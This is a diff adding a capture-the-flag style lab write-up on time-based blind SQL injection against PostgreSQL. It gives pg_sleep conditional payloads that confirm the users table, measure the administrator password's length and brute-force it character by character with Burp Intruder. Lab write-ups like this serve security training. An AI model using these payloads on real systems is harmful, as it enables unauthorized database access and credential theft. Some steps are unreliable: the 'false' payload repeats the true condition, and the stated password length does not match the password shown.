@@ -548,8 +548,54 @@ Blind SQLI : Where database doesn't show the error directly instead they will sh
 
  <img width="1350" height="589" alt="image" src="https://github.com/user-attachments/assets/edacbec0-5e57-416f-a855-1ce0c9aff762" />
 
+- We can see it caused the time delay hence it is using the postgre sql therefore we successfully solved the lab.
+
+# ------------------------------------------------------------------------------
+
+# 14. Blind SQL injection with time delays and information retrieval
+
+<img width="774" height="339" alt="image" src="https://github.com/user-attachments/assets/1356befb-25eb-49c4-9b03-1beb40cdb989" />
+
+### **Goal** : To perform Blind SQLI and find the administrator password and login as administrator user. 
+
+### **Ingrediants** : Same as above. 
+
+### **Solving** : 
+
+- Let's firstly check that it is vulnerable to SQLI or not from the response time delay and it is vulnerable to time based blind SQLI
+
+<img width="1365" height="613" alt="image" src="https://github.com/user-attachments/assets/2eea55d6-fac9-4ef1-9ddd-7c62718f9dc3" />
+
+- Now let's try to confirm user table exist or not by this script first by asking the true or false questions
+
+- True statement ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--. It should give response in time delay. And it is given time delay response. 
+
+<img width="1365" height="590" alt="image" src="https://github.com/user-attachments/assets/f7fe6ecf-aa76-4efa-9416-a0f405eaadb2" />
+
+-  False statement ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--. It shouldn't give response in time delay. And it is given it correctly. 
+
+<img width="1358" height="540" alt="image" src="https://github.com/user-attachments/assets/5233555c-477e-4ffd-98f4-4abce4e4741c" />
+
+- Since both cases gives the correct response as we anticipated. Let's check users table exist and administrator username exist simultaneously. By applying this script. ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--. 
+
+<img width="1362" height="615" alt="image" src="https://github.com/user-attachments/assets/e635da4e-5149-4a09-9cda-162a1196dd8d" />
+
+- It gives the response in time delay hence the user table and administrator user is exist.
+
+- Now let's find the password length and each character of the administrator user one by one as we did in the previous lab using the burp suite intruder.
+
+- The script would be  ' || (select case when (username='administrator' and length(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--.  from 1 to 50 we will iterate.
+
+<img width="1192" height="520" alt="image" src="https://github.com/user-attachments/assets/47120843-e513-481e-86f4-574ba2d37ced" />
+
+- Hence response time differs from the 25 hence the password length is 25. Now we will find the first character of the password by brute forcing the alphanumeric values like ' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--. 
  
+- We will use the cluster bomb attack type and iterate the substring of the password and brute force the password.
 
+<img width="1081" height="480" alt="image" src="https://github.com/user-attachments/assets/37b5911d-c571-4007-855a-eb10896bf753" />
 
+- The password is 3mcv2l6gay7or4cyrt1q. Hence we can login as the administrator and solved the lab. 
 
+<img width="1177" height="591" alt="image" src="https://github.com/user-attachments/assets/b093de4a-d906-4bd8-a306-93e864e95552" />
 
+# ------------------------------------------------------------------------------
